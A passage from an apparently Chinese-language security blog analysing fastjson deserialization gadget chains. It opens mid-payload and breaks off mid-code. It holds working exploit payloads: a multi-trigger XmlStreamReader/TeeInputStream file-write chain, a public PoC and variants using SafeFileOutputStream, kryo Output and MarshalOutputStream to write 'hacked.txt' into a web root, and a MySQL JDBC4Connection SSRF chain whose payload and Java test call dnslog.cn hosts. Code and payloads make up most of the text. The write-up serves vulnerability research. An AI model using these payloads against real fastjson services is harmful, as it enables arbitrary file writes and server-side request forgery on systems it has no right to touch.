<span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;branch\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          \&quot;$ref\&quot;:\&quot;$.branch\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;closeBranch\&quot;: true\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;httpContentType\&quot;:\&quot;text/xml\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;lenient\&quot;:false,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;defaultEncoding\&quot;:\&quot;UTF-8\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;trigger2\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.XmlStreamReader\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;is\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.TeeInputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;input\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          \&quot;$ref\&quot;:\&quot;$.input\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;branch\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          \&quot;$ref\&quot;:\&quot;$.branch\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;closeBranch\&quot;: true\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;httpContentType\&quot;:\&quot;text/xml\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;lenient\&quot;:false,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;defaultEncoding\&quot;:\&quot;UTF-8\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;trigger3\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.XmlStreamReader\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;is\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.TeeInputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;input\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          \&quot;$ref\&quot;:\&quot;$.input\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;branch\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          \&quot;$ref\&quot;:\&quot;$.branch\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;closeBranch\&quot;: true\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;httpContentType\&quot;:\&quot;text/xml\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;lenient\&quot;:false,\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \&quot;defaultEncoding\&quot;:\&quot;UTF-8\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327162424018.png" alt="image-20250327162424018"></p><p>成功写入内容</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327171144065.png" alt="image-20250327171144065"></p><p><span style="color:#FF0000;">这里为什么要 &gt; 8192 呢？ 又是怎样导致的缓冲区溢出成功呢?</span></p><div class="note note-success" > 这其实就是 $ref 的机制，他告诉fastjson：不要在这里创建一个新对象。请使用之前在 JSON 中已经被创建并赋值给 'input' 键的那个对象。</br></br>第一个触发器 (trigger):执行完之后 TeeInputStream 读取了 4096 个字节，同时将这些 4096 字节写入了它的 branch中 此时，文件 尚未被写入任何内容。  </br></br>第二个触发器 (trigger): 通过 $ref 被设置为指向与第一个触发器完全相同的 ReaderInputStream 实例,而流（Stream）会保持它们的状态，知道前 4096 字节已经被读取了，会接着读取后边的字节同时写入branch，此时 branch就已经8192个字节了，已经满了。  </br></br>第三个触发器 (trigger): 使 brach的缓冲区溢出，触发写操作。   简而言之，就是利用多个触发器 (XmlStreamReader)，每个触发器都从一个共享的输入管道 (TeeInputStream) 读取一部分数据，迫使这个管道将数据倾倒入一个共享的输出缓冲区 (FileWriterWithEncoding)，直到该缓冲区溢出并将内容写入目标文件。</div><h4 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h4><p><strong>公开的POC</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这里 SerialOutput 的作用，和我们分析 MarshalOutputStream时，MarshalOutputStream 这个流的作用是一致的，本质上都是OutPutStream的子类，利用super(out) 去 调用write 所以个人感觉 sleepycat 这个包不如 jdk 原生的RMI 包通用 稍作修改</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;protocolVersion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这样也是可以执行写文件的</p><h5 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h5><p>主要 com.esotericsoftware.kryo.io.Output 这个类也具有写文件的能力，对应的依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;<br>    &lt;artifactId&gt;kryo&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>它提供了 setBuffer() 和 setOutputStream() 可以初始化buffer和缓冲区，主要是他的flush() 方法中有 write 操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBuffer</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] buffer)</span> &#123;<br>    <span class="hljs-built_in">this</span>.setBuffer(buffer, buffer.length);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOutputStream</span><span class="hljs-params">(OutputStream outputStream)</span> &#123;<br>    <span class="hljs-built_in">this</span>.outputStream = outputStream;<br>    <span class="hljs-built_in">this</span>.position = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">this</span>.total = <span class="hljs-number">0L</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flush</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> KryoException &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.outputStream != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 利用我们传进来的outputStream执行write方法</span><br>            <span class="hljs-built_in">this</span>.outputStream.write(<span class="hljs-built_in">this</span>.buffer, <span class="hljs-number">0</span>, <span class="hljs-built_in">this</span>.position);<br>            <span class="hljs-built_in">this</span>.outputStream.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KryoException</span>(ex);<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.total += (<span class="hljs-type">long</span>)<span class="hljs-built_in">this</span>.position;<br>        <span class="hljs-built_in">this</span>.position = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里flush可由write方法执行，所以还是用到了OutputStream的子类，初始化时调用 super(out) 和我们之前的分析如出一辙。</p><p>而SafeFileOutputStream 实际上就是封装一个文件的输出流，在执行write() 方法时，把字节流写入指定的文件，当然我们也可以使用上面提到的java.io.FileOutputStream 来进行替换 又得到了一种写文件的POC</p><h5 id="变种"><a href="#变种" class="headerlink" title="变种"></a>变种</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> &#x27;java.io.FileOutputStream&#x27;<span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> &#x27;D<span class="hljs-punctuation">:</span>/test.txt&#x27;<span class="hljs-punctuation">,</span><br>         <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span>     <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;protocolVersion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>其本质的执行原理都是一样的</p><h3 id="Mysql利用"><a href="#Mysql利用" class="headerlink" title="Mysql利用"></a>Mysql利用</h3><h4 id="JDBC4Connection"><a href="#JDBC4Connection" class="headerlink" title="JDBC4Connection"></a>JDBC4Connection</h4><p> Mysql connector 5.1.x 版本</p><p>JDBC4Connection其实是用来简化jdbc的开发流程的，之前需要Class.forName 获得驱动类，再去连接，用JDBC4Connection不再需要显示调用Class.forName，而且他会自动关闭连接，这就意味着它继承了AutoCloseable</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328095109480.png" alt="image-20250328095109480" style="zoom: 50%;" /><p>导入依赖看一下这个类的构造方法</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>看到它会调用super的构造方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328090448823.png" alt="image-20250328090448823"></p><p>super就是com.mysql.jdbc.ConnectionImpl ， 他的构造方法调用 createNewIO()</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328095356671.png" alt="image-20250328095356671"></p><p>createNewIO() 创建com.mysql.jdbc.MysqlIO，尝试建立连接</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328095622119.png" alt="image-20250328095622119"></p><p>看到最终调用了connect</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328095711175.png" alt="image-20250328095711175"></p><p>我们来看一个最简单的SSRF利用测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.mysql.jdbc.JDBC4Connection;<br><br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDBCTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;gmgfoo.dnslog.cn&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">3306</span>;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">info</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        info.setProperty(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br>        info.setProperty(<span class="hljs-string">&quot;password&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br>        info.setProperty(<span class="hljs-string">&quot;NUM_HOSTS&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">JDBC4Connection</span> <span class="hljs-variable">jdbc4Connection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JDBC4Connection</span>(host, port,<br>                    info,<span class="hljs-string">&quot;lingx5&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328101340284.png" alt="image-20250328101340284"></p><p>这就说明我们用 JDBC4Connection的构造方法 是可以发送请求的，而我们就可以用利用这一特性在fastjson中实现SSRF</p><h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;hostToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;kx97t6.dnslog.cn&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;portToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3306</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;root&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;root&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;NUM_HOSTS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;databaseToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;lingx5&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>JDBCssrf</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDBCssrf</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;@type\&quot;: 